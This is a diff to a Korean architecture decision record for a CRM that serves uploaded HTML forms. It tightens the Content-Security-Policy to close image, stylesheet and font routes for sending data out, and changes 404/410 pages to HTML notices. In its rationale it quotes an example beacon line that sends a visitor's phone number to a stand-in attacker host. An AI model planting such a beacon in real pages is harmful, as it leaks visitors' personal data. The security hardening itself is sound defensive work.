@@ -57,3 +57,22 @@ X-Frame-Options: DENY
 - `'unsafe-inline'`이 있으므로 셸 페이지에 서버 측 동적 값을 섞기 시작하면 XSS 경로가 생긴다. 셸은 정적 문자열로 유지한다.
 - 업로드 HTML의 외부 스크립트(`<script src="https://...">`)는 `script-src 'self'`로 막힌다. AI 생성 HTML이 외부 스크립트를 쓰면 그 부분은 동작하지 않는다. 필요해지면 허용 목록을 새 ADR로 정한다.
 - iframe 높이는 브리지의 `lm:resize`로 맞춘다. 브라우저 동작(제출 흐름, 높이)은 이후 Playwright E2E로 검증한다.
+
+## 변경
+
+### 2026-10-23: 이미지·스타일·폰트의 외부 `https:` 허용 제거
+
+CSP를 다음으로 바꾼다. `style-src`, `img-src`, `font-src`에서 `https:`를 뺐고 나머지는 그대로다.
+
+```
+Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; frame-src 'self'; form-action 'none'; base-uri 'none'; frame-ancestors 'none'
+```
+
+- 이유: `connect-src 'self'`와 `form-action 'none'`만으로는 외부 전송을 다 막지 못한다. 업로드 HTML의 스크립트는 방문자 입력을 GET URL에 담아 `new Image().src = "https://evil.example/?phone=..."`, 동적 `<link rel=stylesheet>`, `@font-face` 같은 경로로 보낼 수 있다. 이 CRM은 전화번호·이메일 같은 개인정보를 받으므로, 맥락에서 정한 "방문자의 입력을 운영자가 모르는 외부 주소로 보내지 못한다"를 지키려면 이 경로도 닫아야 한다.
+- 대가: AI가 만든 HTML이 CDN 이미지, 외부 스타일시트(Tailwind CDN 등), 웹폰트(Google Fonts 등)를 쓰면 그 리소스는 불러오지 못한다. 이미지는 빈 자리나 `alt`로, 폰트는 시스템 폰트로, 외부 CSS는 스타일 없이 보인다. 인라인 `<style>`과 `data:` 이미지·폰트는 계속 동작하므로 폼 자체는 쓸 수 있다.
+- 후속: 템플릿 점검 추가 기능(이슈 #16)이 업로드 시 외부 리소스 참조를 찾아 운영자에게 경고한다. 운영자는 그 경고를 보고 리소스를 인라인으로 바꿔 다시 올릴 수 있다.
+- 위 "결정"의 "이미지·폰트·스타일은 ... `https:`를 허용한다"는 이 변경으로 대체된다.
+
+### 2026-10-23: `/l/{code}`의 404·410도 HTML 안내
+
+- `/l/{code}`도 브라우저가 여는 주소라 없는 code·draft 폼의 404와 closed 폼의 410을 ProblemDetail JSON 대신 `/f/{slug}`와 같은 정적 HTML 안내(`WrapperPages.notice`)로 답한다. 상태 코드는 그대로다. `/api/public/**`는 계속 ProblemDetail JSON이다.
